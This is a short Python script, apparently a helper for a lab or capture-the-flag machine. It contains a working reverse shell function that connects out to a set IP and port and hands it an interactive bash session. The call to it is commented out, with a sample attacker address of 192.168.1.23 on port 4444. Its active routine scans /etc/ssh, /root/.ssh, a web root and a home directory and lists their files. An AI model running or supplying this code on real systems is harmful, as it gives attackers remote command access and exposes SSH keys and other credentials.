import socket
import subprocess
import os

def reverse_shell(ip, port):
    """
    Standard Python Reverse Shell to be executed inside the VM.
    """
    print(f"Connecting to {ip}:{port}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((ip, port))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        p = subprocess.call(["/bin/bash", "-i"])
    except Exception as e:
        print(f"Error: {e}")
    finally:
        s.close()

def scan_system():
    """
    Scans for important files in the VM environment.
    """
    paths_to_check = [
        "/home/l0ve/",
        "/var/www/html/",
        "/etc/ssh/",
        "/root/.ssh/"
    ]
    print("--- SYSTEM SCAN RESULTS ---")
    for path in paths_to_check:
        if os.path.exists(path):
            print(f"[FOUND] {path}")
            # List some files
            try:
                files = os.listdir(path)[:5]
                print(f"  Files: {files}")
            except:
                pass
        else:
            print(f"[MISSING] {path}")

if __name__ == "__main__":
    # To use the reverse shell, uncomment below and set your host IP (192.168.1.23)
    # reverse_shell("192.168.1.23", 4444)
    scan_system()
